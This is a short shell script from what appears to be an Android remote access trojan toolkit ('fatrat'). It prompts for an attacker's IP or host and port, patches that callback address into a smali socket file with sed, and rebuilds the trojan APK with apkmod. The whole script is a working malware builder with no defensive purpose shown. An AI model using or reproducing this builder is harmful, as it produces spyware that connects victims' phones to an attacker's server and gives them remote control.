#!/usr/bin/env sh

smaliFile="smali/com/evildevill/fatrat/IOSocket.smali"

if [ -d $PREFIX/share/haxrat -a -d $HOME/haxRat ]; then
    echo "[!] You installed fatrat by both TermuxBlack and Github so please remove anyone first"
    exit 1
elif [ -d $PREFIX/share/haxrat ]; then
    appPath="$PREFIX/share/fatrat/server/app/factory/decompiled"
else
    appPath="$HOME/Fatrat/server/app/factory/decompiled"
fi

read -p "[*] IP/URL/HOST : " host        
read -p "[*] PORT : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R "$appPath" -o ~/fatrat/Fatrat.apk
